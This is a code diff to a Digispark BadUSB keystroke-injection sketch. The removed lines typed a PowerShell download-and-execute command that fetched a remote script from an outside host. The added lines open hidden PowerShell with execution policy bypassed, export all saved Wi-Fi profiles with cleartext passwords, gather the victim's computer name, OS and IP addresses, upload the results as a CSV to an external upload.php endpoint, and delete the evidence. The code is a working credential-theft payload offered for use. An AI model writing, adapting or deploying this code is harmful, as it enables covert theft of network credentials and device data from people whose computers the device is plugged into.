@@ -1,36 +1,74 @@
-#define LAYOUT_US_ENGLISH
 #include "DigiKeyboard.h"
 
-/* --------------------------------------------------------------
- * Digispark payload – fetches the PowerShell script dynamically
- * from payload.php using the supplied token.
- * The PowerShell window is opened *visible* (no hidden flag).
- * -------------------------------------------------------------- */
+#define KEY_R 0x15
+
 void setup() {
-  pinMode(1, OUTPUT);   // onboard LED
+  pinMode(1, OUTPUT); // onboard LED
 }
 
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);       // clear any stuck keys
-  DigiKeyboard.delay(2000);            // give the system a moment
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
 
-  // Use a simple 8‑bit key code to avoid overflow warnings
-  const uint8_t KEY_R_SIMPLE = 0x15; // corresponds to the 'R' key
-
-  // ── Open Run dialog (Win + R) ────────────────────────────────────────
-  DigiKeyboard.sendKeyStroke(KEY_R_SIMPLE, MOD_GUI_LEFT);
+  // Open Run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
 
-  // ── Launch PowerShell (visible) and pull the payload dynamically ────────
-  DigiKeyboard.println(
-    "powershell -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://narain.udhees.com/payload.php?token=Narain')\"");
-  DigiKeyboard.delay(3000);   // give PowerShell time to execute
+  // Launch PowerShell (hidden)
+  DigiKeyboard.println("powershell -w hidden -NoLogo -NoProfile -ExecutionPolicy Bypass");
+  DigiKeyboard.delay(1800);
 
-  // ── Visual feedback – blink the on‑board LED forever ─────────────────────
+  // Wi‑Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
+  DigiKeyboard.print(
+    F(
+      "$u='https://narain.udhees.com/upload.php?token=Narain';"
+      "$t=$env:TEMP;"
+      "netsh wlan export profile folder=\"$t\" key=clear > $null;"
+      "$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
+      "$victimId=$env:COMPUTERNAME;"
+      "try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'};"
+      "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
+      "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
+      "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
+      "$alt='N/A';$lat='N/A';$lon='N/A';"
+      "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
+      "$items=@();"
+      "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
+        "$x=[xml](Get-Content $_.FullName);"
+        "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
+        "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
+        "$items+=[pscustomobject]{"
+          "Time=$ts;"
+          "VictimID=$victimId;"
+          "SSID=$s;"
+          "Password=if($p){$p}else{''};"
+          "VictimLANIP=$lan;"
+          "VictimOS=$os;"
+          "PublicIP=$pub;"
+          "LANExtra=$alt;"
+          "Latitude=$lat;"
+          "Longitude=$lon;"
+          "PacketSummary=''"
+        "};"
+        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
+      "};"
+      "if($items){"
+        "$csv=\"$t\\w.csv\";"
+        "$items|Export-Csv $csv -NoTypeInformation;"
+        "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
+        "Remove-Item $csv -ErrorAction SilentlyContinue;"
+      "};"
+      "exit;"
+    )
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+
+  // Blink LED to confirm completion
   while (true) {
     digitalWrite(1, HIGH);
-    DigiKeyboard.delay(150);
+    DigiKeyboard.delay(200);
     digitalWrite(1, LOW);
-    DigiKeyboard.delay(150);
+    DigiKeyboard.delay(200);
   }
 }
